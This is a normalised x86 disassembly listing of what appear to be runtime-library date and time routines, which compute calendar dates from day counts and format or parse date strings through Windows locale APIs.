push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_3a6b088
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_3a690a0
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_3a690a0
movzx eax [ ebp - 0x10 ]
add eax eax
add eax eax
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_3a690a0
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_3a6b1d8
mov edx eax
movzx eax dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
movzx eax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
movzx ecx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
movzx ecx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
movzx ecx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_3a6b45c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_3a6b310
pop esi
pop ecx
pop ebp
retn 0x8
sub_3a6b47c
push ebx
add esp 0xfffffff8
mov ebx eax
movzx ecx [ ebx + 0x6 ]
movzx edx [ ebx + 0x2 ]
movzx eax [ ebx ]
call sub_3a6b2e0
fstp [ esp ]
fwait
fld [ esp ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
jb r-xdata
movzx eax [ ebx + 0xe ]
push eax
movzx ecx [ ebx + 0xc ]
movzx edx [ ebx + 0xa ]
movzx eax [ ebx + 0x8 ]
call sub_3a6b13c
fsubr [ esp ]
fstp [ esp ]
fwait
movzx eax [ ebx + 0xe ]
push eax
movzx ecx [ ebx + 0xc ]
movzx edx [ ebx + 0xa ]
movzx eax [ ebx + 0x8 ]
call sub_3a6b13c
fadd [ esp ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_3a6b4ec
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_3a6b088
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_3a6b514
add esp 0xffffffe8
lea eax [ esp + 0x8 ]
push eax
call GetLocalTime
movzx ecx [ esp + 0xe ]
movzx edx [ esp + 0xa ]
movzx eax [ esp + 0x8 ]
call sub_3a6b2e0
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x18
retn
sub_3a6b540
add esp 0xffffffe8
lea eax [ esp + 0x8 ]
push eax
call GetLocalTime
movzx eax [ esp + 0x16 ]
push eax
movzx ecx [ esp + 0x18 ]
movzx edx [ esp + 0x16 ]
movzx eax [ esp + 0x14 ]
call sub_3a6b13c
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x18
retn
sub_3a6b588
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_3a63154
sub_3a6b5cc
push ebp
mov ebp esp
mov edx eax
test edx edx
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_3a6b588
pop ecx
pop ebp
retn
sub edx 0x4
mov edx [ edx ]
sub_3a6b5e8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_3a6a458
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_3a6b588
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a6b634
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
movzx ecx [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_3a6b660
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_3a6b45c
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_3a6b698
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_3a6b17c
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_3a6b6d8
push ebp
mov ebp esp
add esp 0xfffffee4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x11c ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_3a6b83a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_3a652a0
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a65338
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6b841
lea eax [ ebp - 0x11c ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_3a65510
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
mov [ ebp - 0x118 ] eax
mov esi [ ebp - 0x118 ]
test esi esi
je r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_3a6df10
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_3a65798
jmp r-xdata
mov eax [ ebx ]
mov edx esi
call sub_3a6dd70
cmp eax 0x4
jne r-xdata
sub esi 0x4
mov esi [ esi ]
mov eax [ ebx ]
mov edx 0x3
call sub_3a6de8c
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x11c ]
mov edx esi
call sub_3a65498
mov eax [ ebp - 0x11c ]
mov edx 0x2
call sub_3a6df10
mov ecx eax
mov eax ebx
mov edx esi
call sub_3a65390
sub_3a6b854
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_3a6b942
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_3a652a0
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a65338
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a65338
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6b949
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_3a65510
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
mov eax [ ebx ]
mov [ ebp - 0x118 ] eax
mov esi [ ebp - 0x118 ]
test esi esi
je r-xdata
push ebx
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_3a65798
sub esi 0x4
mov esi [ esi ]
sub_3a6b96c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x4 ] eax
lea edi [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_3a6c0f0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6c0f7
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_3a652c4
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov [ ebp - 0x1e ] 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1f ] 0x0
jmp r-xdata
mov eax [ edi ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ edi ]
movzx eax [ eax ]
mov [ ebp - 0x5 ] al
movzx eax [ ebp - 0x5 ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ edi ]
call sub_3a6dfa0
mov [ edi ] eax
movzx ebx [ ebp - 0x5 ]
mov eax ebx
add al 0x9f
sub al 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi ]
call sub_3a6df80
mov edx eax
mov eax [ edi ]
call sub_3a6b588
pop ecx
mov eax [ edi ]
call sub_3a6dfa0
mov [ edi ] eax
mov [ ebp - 0x1e ] 0x20
jmp r-xdata
mov eax ebx
add al 0xbf
sub al 0x1a
jae r-xdata
sub bl 0x20
movzx eax bl
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp bl 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_3a6b588
pop ecx
movzx eax [ eax + lookup_table_3a6ba54 ]
jmp [ eax * 4 + jump_table_3a6ba8d ]
mov [ ebp - 0x1e ] bl
cmp [ ebp - 0x1e ] 0x48
jne r-xdata
push ebp
call sub_3a6b634
pop ecx
push ebp
call sub_3a6b660
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_3a6b634
pop ecx
push ebp
call sub_3a6b660
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_3a6b6d8
pop ecx
mov eax [ ebp - 0x28 ]
call sub_3a6b5cc
pop ecx
jmp r-xdata
push ebp
call sub_3a6b634
pop ecx
push ebp
call sub_3a6b660
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
call sub_3a6b854
pop ecx
mov eax [ ebp - 0x2c ]
call sub_3a6b5cc
pop ecx
jmp r-xdata
push ebp
call sub_3a6b634
pop ecx
push ebp
call sub_3a6b660
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_3a6b634
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_3a6b634
pop ecx
push ebp
call sub_3a6b698
pop ecx
mov [ ebp - 0x20 ] 0x0
mov esi [ edi ]
jmp r-xdata
push ebp
call sub_3a6b634
pop ecx
push ebp
call sub_3a6b698
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_3a6b634
pop ecx
push ebp
call sub_3a6b698
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_3a6b634
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_3a6b634
pop ecx
push ebp
call sub_3a6b698
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_3a6b698
pop ecx
mov esi [ edi ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_3a6a2b4
test eax eax
jne r-xdata
push ebp
call sub_3a6b634
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_3a6b96c
pop ecx
push ebp
call sub_3a6b698
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ edi ]
jmp r-xdata
mov bl 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_3a6b5e8
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_3a6b5e8
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_3a6b5e8
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_3a6b660
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_3a6b5e8
pop ecx
jmp r-xdata
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_3a6b5e8
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_3a6b5e8
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_3a6b96c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_3a6b96c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_3a6b5e8
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_3a6a2b4
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_3a6b588
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_3a6b96c
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_3a6b588
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_3a6b588
pop ecx
jmp r-xdata
mov eax [ edi ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_3a6b5cc
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_3a6b4ec
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_3a6b5cc
pop ecx
jmp r-xdata
dec eax
je r-xdata
movzx eax [ esi ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
movzx eax [ ebp - 0x16 ]
mov [ ebp - 0x22 ] ax
cmp [ ebp - 0x1f ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_3a6a2b4
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_3a6b588
pop ecx
add [ edi ] 0x4
mov [ ebp - 0x1f ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ edi ]
sub edx esi
mov eax esi
call sub_3a6b588
pop ecx
mov eax [ edi ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ edi ]
movzx eax [ eax ]
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_3a6b5cc
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_3a6b4ec
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_3a6b5cc
pop ecx
jmp r-xdata
dec eax
je r-xdata
movzx eax [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_3a6dfa0
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
cmp [ ebp - 0x22 ] 0x0
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_3a6a2b4
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_3a6b588
pop ecx
add [ edi ] 0x2
mov [ ebp - 0x1f ] 0x1
jmp r-xdata
add esi 0x2
inc [ edi ]
jmp r-xdata
mov eax [ edi ]
movzx eax [ eax ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_3a6b96c
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x22 ]
mov edx [ ebp - 0xc ]
call sub_3a6b5e8
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp [ ebp - 0x22 ] 0xc
jbe r-xdata
mov [ ebp - 0x22 ] 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_3a6a2b4
test eax eax
jne r-xdata
push ebp
call sub_3a6b660
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_3a6b4ec
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_3a6b5cc
pop ecx
add [ edi ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_3a6b5cc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_3a6b5cc
pop ecx
jmp r-xdata
inc [ edi ]
mov eax [ edi ]
call sub_3a6dfa0
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_3a6b96c
pop ecx
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub [ ebp - 0x22 ] 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_3a6b588
pop ecx
jmp r-xdata
push ebp
call sub_3a6b660
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_3a6b4ec
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_3a6b5cc
pop ecx
add [ edi ] 0x2
jmp r-xdata
add [ edi ] 0x3
mov [ ebp - 0x1f ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_3a6a2b4
test eax eax
je r-xdata
jmp r-xdata
movzx eax [ ebp - 0x20 ]
xor al 0x1
mov [ ebp - 0x20 ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1f ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_3a6a2b4
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_3a6a2b4
test eax eax
jne r-xdata
jmp r-xdata
sub_3a6c124
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_3a6b96c
pop ecx
push ebp
mov eax ebx
call sub_3a6b96c
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_3a65390
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_3a6c180
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_3a65560
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_3a6c1a4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_3a6c180
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_3a65560
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
movzx eax [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
movzx edx [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_3a6c238
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a6c2fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6c305
lea eax [ ebp - 0x14 ]
call sub_3a652a0
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a6c180
mov esi ebx
test esi esi
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov ecx esi
mov eax [ ebp - 0x4 ]
call sub_3a65798
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov esi ebx
test esi esi
je r-xdata
sub esi 0x4
mov esi [ esi ]
mov edi [ ebp - 0x10 ]
test edi edi
je r-xdata
sub esi 0x4
mov esi [ esi ]
push edi
mov eax [ ebp - 0x10 ]
call sub_3a65730
push eax
push esi
mov eax ebx
call sub_3a65730
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
jne r-xdata
sub edi 0x4
mov edi [ edi ]
mov eax ebx
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
add [ edx ] eax
mov [ ebp - 0x9 ] 0x1
sub eax 0x4
mov eax [ eax ]
sub_3a6c310
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_3a6c180
mov eax esi
test eax eax
je r-xdata
cmp eax [ edi ]
jl r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
movzx eax [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_3a6c34c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_3a65560
cmp edi eax
jle r-xdata
movzx eax [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_3a6c398
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_3a65560
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
movzx eax [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
movzx eax [ esi + eax - 0x1 ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_3a6dfe0
mov [ ebx ] eax
jmp r-xdata
sub_3a6c3e0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_3a65730
push eax
mov eax [ ebx ]
call sub_3a65730
pop edx
call sub_3a6e188
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_3a6c434
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_3a6b574
movzx ecx ax
mov eax [ ebp + 0x8 ]
